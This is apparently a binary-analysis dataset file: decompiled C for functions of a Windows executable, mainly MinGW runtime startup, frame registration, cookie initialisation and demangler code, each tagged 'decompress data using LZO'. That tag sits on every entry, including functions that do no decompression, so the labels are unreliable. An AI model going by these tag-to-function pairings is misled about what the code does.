{
    "null": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint entry0(uint *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    char **ppcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint uVar8;\n    bool bVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    uint *unaff_EBX;\n    uchar *unaff_EBP;\n    int32_t unaff_ESI;\n    uint *puVar12;\n    uint *unaff_EDI;\n    int32_t in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint uStack100;\n    uint var_5ch;\n    uint8_t uStack56;\n    uint var_30h;\n    uint var_2ch;\n    uchar *puStack24;\n    uint *var_10h;\n    int32_t iStack16;\n    uint *puStack12;\n    uchar *puStack8;\n    uint uStack4;\n    \n    *0x5493b8 = 0;\n    iStack16 = 0x4014b2;\n    fcn.00417ac0();\n    puStack8 = unaff_EBP;\ncode_r0x00401150:\n    puStack24 = &stack0x00000004;\n    puVar3 = &stack0xffffff9c;\n    var_10h = unaff_EBX;\n    iStack16 = unaff_ESI;\n    puStack12 = unaff_EDI;\n    uStack4 = unaff_retaddr;\n    for (iVar10 = 0x11; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (*0x5493b8 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&stack0xffffff9c);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    unaff_EDI = *(*(in_FS_OFFSET + 0x18) + 4);\n    while( true ) {\n        puVar3 = NULL;\n        LOCK();\n        puVar6 = unaff_EDI;\n        if (*0x549df8 != NULL) {\n            puVar3 = *0x549df8;\n            puVar6 = *0x549df8;\n        }\n        *0x549df8 = puVar6;\n        if (puVar3 == NULL) {\n            puVar3 = NULL;\n            goto joined_r0x004013dd;\n        }\n        if (unaff_EDI == puVar3) break;\n        (*pcVar2)(1000);\n    }\n    puVar3 = 0x1;\njoined_r0x004013dd:\n    if (*0x549df4 == 1) {\n        sub.msvcrt.dll__amsg_exit(0x1f);\n    }\n    else if (*0x549df4 == 0) {\n        *0x549df4 = 1;\n        sub.msvcrt.dll__initterm(0x54b00c, 0x54b018);\n    }\n    else {\n        *0x549004 = 1;\n    }\n    if (*0x549df4 == 1) {\n        sub.msvcrt.dll__initterm(0x54b000, 0x54b008);\n        *0x549df4 = 2;\n    }\n    if (puVar3 == NULL) {\n        *0x549df8 = puVar3;\n    }\n    if (*0x505334 != NULL) {\n        (**0x505334)(0, 2, 0);\n    }\n    fcn.00417f50();\n    *0x5493cc = (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0x4181d0);\n    uStack4 = 0x40123d;\n    fcn.00427a30();\n    uStack4 = 0x401242;\n    fcn.00417dd0();\n    *0x549de8 = 0x400000;\n    uStack4 = 0x401251;\n    ppcVar4 = sub.msvcrt.dll___p__acmdln();\n    unaff_EBX = *0x549018;\n    pcVar5 = *ppcVar4;\n    bVar9 = false;\n    if (pcVar5 != NULL) {\n        do {\n            cVar1 = *pcVar5;\n            if (cVar1 < '!') {\n                if ((cVar1 == '\\0') || (!bVar9)) goto code_r0x00401290;\n                bVar9 = true;\n            }\n            else if (cVar1 == '\\\"') {\n                bVar9 = bVar9 ^ 1;\n            }\n            pcVar5 = pcVar5 + 1;\n        } while( true );\n    }\n    goto code_r0x004012b4;\ncode_r0x00401290:\n    *0x549dec = pcVar5;\n    if (cVar1 != '\\0') {\n        do {\n            pcVar5 = pcVar5 + 1;\n            *0x549dec = pcVar5;\n            if (*pcVar5 == '\\0') break;\n        } while (*pcVar5 < '!');\n    }\ncode_r0x004012b4:\n    if ((*0x5493b8 != 0) && (*0x4ae000 = 10,  (uStack56 & 1) != 0)) {\n        *0x4ae000 = var_30h;\n    }\n    unaff_ESI = *0x549018 * 4 + 4;\n    uStack4 = 0x4012e7;\n    puVar6 = sub.msvcrt.dll_malloc();\n    puVar3 = puVar6;\n    if (0 < unaff_EBX) {\n        puVar7 = *0x549014 + unaff_EBX;\n        puVar12 = *0x549014;\n        do {\n            puVar11 = puVar3 + 1;\n            unaff_EDI = puVar12 + 1;\n            uStack4 = 0x401320;\n            iVar10 = sub.msvcrt.dll_strlen();\n            unaff_ESI = iVar10 + 1;\n            uStack4 = 0x40132b;\n            uVar8 = sub.msvcrt.dll_malloc();\n            *puVar3 = uVar8;\n            param_1 = *puVar12;\n            uStack4 = 0x401341;\n            param_2 = unaff_ESI;\n            sub.msvcrt.dll_memcpy();\n            puVar3 = puVar11;\n            puVar12 = unaff_EDI;\n        } while (puVar7 != unaff_EDI);\n        puVar3 = puVar6 + unaff_EBX;\n        unaff_EBX = puVar11;\n    }\n    *puVar3 = 0;\n    uStack4 = 0x40135f;\n    *0x549014 = puVar6;\n    fcn.00417a80();\n    *_sym.imp.msvcrt.dll___initenv = *0x549010;\n    param_2 = *0x549010;\n    param_1 = *0x549014;\n    uStack4 = 0x40138b;\n    *0x54900c = main();\n    if (*0x549008 != 0) {\n        if (*0x549004 == 0) {\n            uStack4 = 0x4013ad;\n            sub.msvcrt.dll__cexit();\n        }\n        return *0x54900c;\n    }\n    uStack4 = 0x401474;\n    unaff_retaddr = *0x54900c;\n    sub.msvcrt.dll_exit();\n    *0x5493b8 = 1;\n    iStack16 = 0x401492;\n    fcn.00417ac0();\n    puStack8 = &stack0xfffffff8;\n    goto code_r0x00401150;\n}\n",
        "token_count": 1793
    },
    "0x41b7c2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid case.0x41b7c2.5(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar2 == 0) {\n        *0x4ae004 = 0x41ca80;\n        pcVar3 = 0x41c830;\n    }\n    else {\n        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"__register_frame_info\");\n        *0x4ae004 = (*pcVar1)(iVar2, \"__deregister_frame_info\");\n    }\n    if (pcVar3 != NULL) {\n        (*pcVar3)(0x50c0f8, 0x54901c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 283
    },
    "00401590": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00401590(void)\n\n{\n    if (*0x4ae004 != NULL) {\n        (**0x4ae004)(0x50c0f8);\n    }\n    if (*0x549df0 != 0) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(*0x549df0);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0040df60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040df60(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = **(in_EAX + 0xc);\n    if ((cVar1 != 'R') && (cVar1 != 'O')) {\n        return param_2;\n    }\n    iVar3 = *(in_EAX + 0x2c) + 3;\n    if (cVar1 == 'R') {\n        iVar3 = *(in_EAX + 0x2c) + 2;\n    }\n    *(in_EAX + 0x2c) = iVar3;\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    uVar2 = fcn.0040df00(0);\n    return uVar2;\n}\n",
        "token_count": 206
    },
    "0040e0d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040e0d0(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    char *pcVar3;\n    bool bVar4;\n    char **in_EAX;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    \n    pcVar3 = *in_EAX;\n    cVar2 = *pcVar3;\n    if (cVar2 == 'n') {\n        pcVar6 = pcVar3 + 1;\n        *in_EAX = pcVar6;\n        cVar2 = pcVar3[1];\n        if (9 < cVar2 - 0x30U) {\n            return 0;\n        }\n        bVar4 = true;\n    }\n    else {\n        if (9 < cVar2 - 0x30U) {\n            return 0;\n        }\n        bVar4 = false;\n        pcVar6 = pcVar3;\n    }\n    iVar5 = cVar2;\n    iVar7 = 0;\n    do {\n        pcVar6 = pcVar6 + 1;\n        *in_EAX = pcVar6;\n        iVar1 = iVar5 + iVar7 * 10;\n        iVar5 = *pcVar6;\n        iVar7 = iVar1 + -0x30;\n        if (9 < *pcVar6 - 0x30U) {\n            if (bVar4) {\n                iVar7 = 0x30 - iVar1;\n            }\n            return iVar7;\n        }\n    } while (iVar7 <= (0x7fffffffU - (iVar5 + -0x30)) / 10);\n    return -1;\n}\n",
        "token_count": 364
    },
    "0040e3f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e3f0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    \n    uVar2 = *(in_EAX + 0x28);\n    pcVar3 = *(in_EAX + 0xc);\n    cVar1 = *pcVar3;\n    while (cVar1 == 'B') {\n        *(in_EAX + 0xc) = pcVar3 + 1;\n        uVar4 = fcn.0040e270();\n        param_2 = fcn.0040df00(uVar4);\n        pcVar3 = *(in_EAX + 0xc);\n        cVar1 = *pcVar3;\n    }\n    *(in_EAX + 0x28) = uVar2;\n    return param_2;\n}\n",
        "token_count": 204
    },
    "0040e440": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0040e440(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char cVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    uint *puVar10;\n    bool bVar11;\n    \n    pcVar2 = *(in_EAX + 0xc);\n    if (*pcVar2 != 'S') {\n        return NULL;\n    }\n    *(in_EAX + 0xc) = pcVar2 + 1;\n    if (pcVar2[1] == '\\0') {\n        cVar4 = '\\0';\ncode_r0x0040e465:\n        bVar11 = (*(in_EAX + 8) & 8) != 0;\n        if ((!bVar11) && ((param_2 & 1) != 0)) {\n            bVar11 = **(in_EAX + 0xc) + 0xbdU < 2 || bVar11;\n        }\n        pcVar2 = 0x504260;\n        cVar7 = 't';\n        while (cVar4 != cVar7) {\n            pcVar2 = pcVar2 + 0x1c;\n            if (pcVar2 == 0x504324) {\n                return NULL;\n            }\n            cVar7 = *pcVar2;\n        }\n        iVar5 = *(pcVar2 + 0x14);\n        iVar6 = *(in_EAX + 0x14);\n        iVar1 = *(in_EAX + 0x18);\n        if (iVar5 != 0) {\n            uVar9 = *(pcVar2 + 0x18);\n            if (iVar6 < iVar1) {\n                puVar10 = iVar6 * 0x10 + *(in_EAX + 0x10);\n                puVar10[1] = 0;\n                *(in_EAX + 0x14) = iVar6 + 1;\n                *puVar10 = 0x18;\n                puVar10[2] = iVar5;\n                puVar10[3] = uVar9;\n                iVar6 = iVar6 + 1;\n            }\n            else {\n                puVar10 = NULL;\n            }\n            *(in_EAX + 0x28) = puVar10;\n        }\n        if (bVar11) {\n            uVar9 = *(pcVar2 + 0xc);\n            iVar5 = *(pcVar2 + 0x10);\n        }\n        else {\n            uVar9 = *(pcVar2 + 4);\n            iVar5 = *(pcVar2 + 8);\n        }\n        *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + iVar5;\n        if (iVar6 < iVar1) {\n            puVar10 = iVar6 * 0x10 + *(in_EAX + 0x10);\n            puVar10[1] = 0;\n            *(in_EAX + 0x14) = iVar6 + 1;\n            *puVar10 = 0x18;\n            puVar10[2] = uVar9;\n            puVar10[3] = iVar5;\n        }\n        else {\n            puVar10 = NULL;\n        }\n        if (**(in_EAX + 0xc) == 'B') {\n            puVar10 = fcn.0040e3f0();\n            if ((puVar10 != NULL) && (iVar5 = *(in_EAX + 0x20),  iVar5 < *(in_EAX + 0x24))) {\n                *(*(in_EAX + 0x1c) + iVar5 * 4) = puVar10;\n                *(in_EAX + 0x20) = iVar5 + 1;\n                return puVar10;\n            }\n            return NULL;\n        }\n        return puVar10;\n    }\n    *(in_EAX + 0xc) = pcVar2 + 2;\n    cVar4 = pcVar2[1];\n    iVar5 = cVar4;\n    if ((cVar4 - 0x30U < 10) || (cVar4 == '_')) {\n        uVar8 = 0;\n        if (cVar4 == '_') {\ncode_r0x0040e4d8:\n            if (*(in_EAX + 0x20) < uVar8 || *(in_EAX + 0x20) == uVar8) {\n                return NULL;\n            }\n            return *(*(in_EAX + 0x1c) + uVar8 * 4);\n        }\n    }\n    else if (0x19 < cVar4 + 0xbfU) goto code_r0x0040e465;\n    uVar8 = 0;\n    if (9 < cVar4 - 0x30U) goto code_r0x0040e53b;\n    do {\n        uVar3 = uVar8;\n        uVar8 = iVar5 + -0x30 + uVar8 * 0x24;\n        while( true ) {\n            if (uVar8 < uVar3) {\n                return NULL;\n            }\n            pcVar2 = *(in_EAX + 0xc);\n            if (*pcVar2 == '\\0') {\n                iVar5 = 0;\n            }\n            else {\n                *(in_EAX + 0xc) = pcVar2 + 1;\n                iVar5 = *pcVar2;\n                if (*pcVar2 == '_') {\n                    uVar8 = uVar8 + 1;\n                    goto code_r0x0040e4d8;\n                }\n            }\n            if (iVar5 - 0x30U < 10) break;\ncode_r0x0040e53b:\n            if (0x19 < iVar5 + 0xbfU) {\n                return NULL;\n            }\n            uVar3 = uVar8;\n            uVar8 = iVar5 + -0x37 + uVar8 * 0x24;\n        }\n    } while( true );\n}\n",
        "token_count": 1353
    },
    "0040e7c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040e7c0(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    \n    if (param_2 == NULL) {\n        return NULL;\n    }\n    do {\n    // switch table (76 cases) at 0x503640\n        switch(*param_2) {\n        case 0:\n        case 6:\n        case 0x18:\n        case 0x27:\n        case 0x2c:\n        case 0x31:\n        case 0x40:\n        case 0x41:\n        case 0x45:\n        case 0x46:\n        case 0x47:\n        case 0x4a:\n        case 0x4b:\n            goto code_r0x0040e7f7;\n        case 5:\n            piVar1 = fcn.0040e790();\n            if ((piVar1 != NULL) && (*piVar1 == 0x2f)) {\n                return piVar1;\n            }\n            goto code_r0x0040e7f7;\n        case 7:\n        case 8:\n        case 0x32:\n            goto code_r0x0040e7ee;\n        }\n        piVar1 = fcn.0040e7c0();\n        if (piVar1 != NULL) {\n            return piVar1;\n        }\ncode_r0x0040e7ee:\n        param_2 = param_2[3];\n    } while (param_2 != NULL);\ncode_r0x0040e7f7:\n    return NULL;\n}\n",
        "token_count": 355
    },
    "00417ac0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00417ac0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t auStack40 [6];\n    \n    uStack44 = 0;\n    auStack40[0] = 0;\n    if (*0x4f74d4 != 0xbb40e64e) {\n        *0x4f74d8 = ~*0x4f74d4;\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&uStack44);\n    uVar4 = uStack48 ^ uStack44;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(auStack40);\n    *0x4f74d4 = uStack44 ^ uVar4 ^ auStack40[0] ^ uVar1 ^ uVar2 ^ uVar3;\n    if (*0x4f74d4 == 0xbb40e64e) {\n        *0x4f74d8 = 0x44bf19b0;\n        *0x4f74d4 = 0xbb40e64f;\n    }\n    else {\n        *0x4f74d8 = ~*0x4f74d4;\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00417b70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417b70(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    \n    *0x549340 = 0xc0000409;\n    *0x549344 = 1;\n    *0x54910c = arg_8h;\n    *0x549118 = unaff_retaddr;\n    *0x549124 = *0x10;\n    *0x54934c = unaff_retaddr;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x50532c);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    uVar2 = 0xc0000409;\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0xc0000409);\n    sub.msvcrt.dll_abort();\n    if ((iVar1 != 3) && (iVar1 != 0)) {\n        return 1;\n    }\n    fcn.00418500(0x417bef, iVar1, uVar2);\n    return 1;\n}\n",
        "token_count": 272
    },
    "00417e00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00417fb8)\n// WARNING: Removing unreachable block (ram,0x00418081)\n// WARNING: Removing unreachable block (ram,0x00417fc7)\n// WARNING: Removing unreachable block (ram,0x00418105)\n// WARNING: Removing unreachable block (ram,0x00418113)\n// WARNING: Removing unreachable block (ram,0x004181b6)\n// WARNING: Removing unreachable block (ram,0x00418121)\n// WARNING: Removing unreachable block (ram,0x00418086)\n// WARNING: Removing unreachable block (ram,0x0041808e)\n// WARNING: Removing unreachable block (ram,0x00418099)\n// WARNING: Removing unreachable block (ram,0x004181c0)\n// WARNING: Removing unreachable block (ram,0x00418230)\n// WARNING: Removing unreachable block (ram,0x00418281)\n// WARNING: Removing unreachable block (ram,0x0041829a)\n// WARNING: Removing unreachable block (ram,0x00418237)\n// WARNING: Removing unreachable block (ram,0x0041823e)\n// WARNING: Removing unreachable block (ram,0x004181e3)\n// WARNING: Removing unreachable block (ram,0x00418245)\n// WARNING: Removing unreachable block (ram,0x00418305)\n// WARNING: Removing unreachable block (ram,0x00418262)\n// WARNING: Removing unreachable block (ram,0x004182f0)\n// WARNING: Removing unreachable block (ram,0x004181ea)\n// WARNING: Removing unreachable block (ram,0x004182b5)\n// WARNING: Removing unreachable block (ram,0x004182bc)\n// WARNING: Removing unreachable block (ram,0x00418325)\n// WARNING: Removing unreachable block (ram,0x004182d5)\n// WARNING: Removing unreachable block (ram,0x004182d9)\n// WARNING: Removing unreachable block (ram,0x004181f5)\n// WARNING: Removing unreachable block (ram,0x0041833e)\n// WARNING: Removing unreachable block (ram,0x00418212)\n// WARNING: Removing unreachable block (ram,0x00418216)\n// WARNING: Removing unreachable block (ram,0x0041826a)\n// WARNING: Removing unreachable block (ram,0x00418277)\n// WARNING: Removing unreachable block (ram,0x00418360)\n// WARNING: Removing unreachable block (ram,0x004182fe)\n// WARNING: Removing unreachable block (ram,0x004180a5)\n// WARNING: Removing unreachable block (ram,0x004180b4)\n// WARNING: Removing unreachable block (ram,0x004180c0)\n// WARNING: Removing unreachable block (ram,0x00418131)\n// WARNING: Removing unreachable block (ram,0x0041814a)\n// WARNING: Removing unreachable block (ram,0x0041814d)\n// WARNING: Removing unreachable block (ram,0x004180e3)\n// WARNING: Removing unreachable block (ram,0x004181a2)\n// WARNING: Removing unreachable block (ram,0x004180ec)\n// WARNING: Removing unreachable block (ram,0x004180f5)\n// WARNING: Removing unreachable block (ram,0x00418180)\n// WARNING: Removing unreachable block (ram,0x0041818e)\n// WARNING: Removing unreachable block (ram,0x00418191)\n// WARNING: Removing unreachable block (ram,0x00418163)\n// WARNING: Removing unreachable block (ram,0x00418172)\n// WARNING: Removing unreachable block (ram,0x00417fcf)\n// WARNING: Removing unreachable block (ram,0x00417fd4)\n// WARNING: Removing unreachable block (ram,0x00417fdc)\n// WARNING: Removing unreachable block (ram,0x00418003)\n// WARNING: Removing unreachable block (ram,0x00418028)\n// WARNING: Removing unreachable block (ram,0x0041802b)\n// WARNING: Removing unreachable block (ram,0x00418039)\n// WARNING: Removing unreachable block (ram,0x00418042)\n// WARNING: Removing unreachable block (ram,0x00418054)\n// WARNING: Removing unreachable block (ram,0x0041806e)\n// WARNING: Removing unreachable block (ram,0x00418079)\n// WARNING: Removing unreachable block (ram,0x00418000)\n\nuint32_t fcn.00417e00(void)\n\n{\n    uint32_t in_EAX;\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uchar auStack105 [25];\n    uint uStack80;\n    uint32_t uStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    uint uStack40;\n    uint uStack28;\n    uint32_t uStack20;\n    \n    if (*0x5493c0 < 1) goto code_r0x00417f10;\n    iVar4 = 0;\n    puVar3 = *0x5493c4 + 0xc;\n    do {\n        if ((*puVar3 <= in_EAX) && (in_EAX < *puVar3 + *(puVar3[1] + 8))) {\n            return in_EAX;\n        }\n        iVar4 = iVar4 + 1;\n        puVar3 = puVar3 + 5;\n        iStack72 = *0x5493c0;\n    } while (iVar4 != *0x5493c0);\n    do {\n        iStack68 = fcn.004186f0();\n        if (iStack68 == 0) {\ncode_r0x00417f37:\n            uVar2 = fcn.004a6950();\n            if (*0x5493bc == 0) {\n                *0x5493bc = 1;\n                uStack76 = in_EAX;\n                fcn.00418760();\n                iVar4 = fcn.00418950();\n                *0x5493c0 = 0;\n                *0x5493c4 = &stack0xffffff97 + -iVar4 & 0xfffffff0;\n                uVar2 = 0;\n            }\n            return uVar2;\n        }\n        in_EAX = iStack72 * 0x14;\n        puVar1 = *0x5493c4 + in_EAX;\n        puVar1[4] = iStack68;\n        *puVar1 = 0;\n        iVar4 = fcn.004187f0();\n        *(*0x5493c4 + 0xc + in_EAX) = iVar4 + *(iStack68 + 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_VirtualQuery)();\n        if (iVar4 == 0) {\n            fcn.004a6950();\n            goto code_r0x00417f37;\n        }\n        uVar2 = uStack20;\n        if (((uStack20 - 0x40 & 0xffffffbf) == 0) || (uVar2 = uStack20 - 4 & 0xfffffffb,  uVar2 == 0)) {\ncode_r0x00417eae:\n            *0x5493c0 = *0x5493c0 + 1;\n            return uVar2;\n        }\n        iVar4 = in_EAX + *0x5493c4;\n        *(iVar4 + 4) = uStack40;\n        *(iVar4 + 8) = uStack28;\n        uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (uVar2 != 0) goto code_r0x00417eae;\n        uStack80 = 0x417efa;\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        in_EAX = fcn.004a6950();\ncode_r0x00417f10:\n        iStack72 = 0;\n    } while( true );\n}\n",
        "token_count": 1771
    },
    "00418370": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00418370(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x5493d8);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x5493d0; puVar1 != NULL; puVar1 = puVar1[2]) {\n        iVar4 = (*pcVar3)(*puVar1);\n        iVar5 = (*pcVar2)();\n        if ((iVar5 == 0) && (iVar4 != 0)) {\n            (*puVar1[1])(iVar4);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x5493d8);\n    return;\n}\n",
        "token_count": 208
    },
    "00418500": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00418500(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (param_2 != 1) {\n        if (param_2 == 0) {\n            if (*0x5493d4 != 0) {\n                fcn.00418370();\n            }\n            iVar2 = *0x5493d0;\n            if (*0x5493d4 == 1) {\n                while (iVar2 != 0) {\n                    iVar1 = *(iVar2 + 8);\n                    fcn.00427908(iVar2);\n                    iVar2 = iVar1;\n                }\n                *0x5493d0 = 0;\n                *0x5493d4 = 0;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x5493d8);\n            }\n        }\n        else if (param_2 == 2) {\n            fcn.00417dd0();\n        }\n        else if ((param_2 == 3) && (*0x5493d4 != 0)) {\n            fcn.00418370();\n        }\n        return 1;\n    }\n    if (*0x5493d4 == 0) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x5493d8);\n    }\n    *0x5493d4 = 1;\n    return 1;\n}\n",
        "token_count": 314
    },
    "00418ba0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00418ba0(int32_t *param_1, code *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (*param_1 == 0) {\n            LOCK();\n            piVar1 = param_1 + 1;\n            *piVar1 = *piVar1 + 1;\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            if (*piVar1 == 0) {\n                (*param_2)();\n                *param_1 = 1;\n                return 0;\n            }\n            iVar2 = *param_1;\n            while (iVar2 == 0) {\n                (*pcVar3)(0);\n                iVar2 = *param_1;\n            }\n        }\n        return 0;\n    }\n    return 0x16;\n}\n",
        "token_count": 209
    },
    "0041a910": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a910(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint unaff_retaddr;\n    uint auStack224 [38];\n    uint uStack72;\n    uint uStack68;\n    uint uStack60;\n    \n    puVar4 = in_EAX;\n    for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    in_EAX[0x18] = 0x40000000;\n    in_EAX[0x13] = unaff_retaddr;\n    iVar3 = fcn.00419990();\n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    if (iVar3 == 0) {\n        if (*0x4f59f4 == 0) {\n            if (*0x5493f4 == '\\0') {\n                *0x5493f4 = '\\x04';\n                *0x5493f6 = 4;\n                *0x5493f5 = 4;\n                *0x5493f7 = 4;\n                *0x5493fa = 4;\n                *0x5493fb = 4;\n                *0x5493f9 = 4;\n                *0x5493f8 = '\\x04';\n                *0x5493ff = 0xc;\n                *0x549400 = 0xc;\n                *0x549401 = 0xc;\n                *0x549402 = 0xc;\n                *0x549403 = 0xc;\n                *0x549404 = 0xc;\n                *0x5493fd = 4;\n                *0x5493fc = 4;\n            }\n        }\n        else if (*0x4f59f8 == 0) {\n            LOCK();\n            *0x4f59fc = *0x4f59fc + 1;\n            if (*0x4f59fc == 0) {\n                *0x5493f4 = '\\x04';\n                *0x5493f6 = 4;\n                *0x5493f5 = 4;\n                *0x5493f7 = 4;\n                *0x5493fa = 4;\n                *0x5493fb = 4;\n                *0x5493f9 = 4;\n                *0x5493f8 = '\\x04';\n                *0x5493ff = 0xc;\n                *0x549400 = 0xc;\n                *0x549401 = 0xc;\n                *0x549402 = 0xc;\n                *0x549403 = 0xc;\n                *0x549404 = 0xc;\n                *0x5493fd = 4;\n                *0x5493fc = 4;\n                *0x4f59f8 = 1;\n            }\n            else {\n                do {\n                    (*pcVar2)(0);\n                } while (*0x4f59f8 == 0);\n            }\n        }\n        if (*0x5493f8 == '\\x04') {\n            if ((*(in_EAX + 99) & 0x40) != 0) {\n                *(in_EAX + 0x1c) = 0;\n            }\n            uStack60 = 1;\n            in_EAX[4] = auStack224;\n            uStack68 = 4;\n            uStack72 = 0;\n            auStack224[0] = param_2;\n            fcn.0041a630();\n            in_EAX[0x13] = param_1;\n            return;\n        }\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar3 = 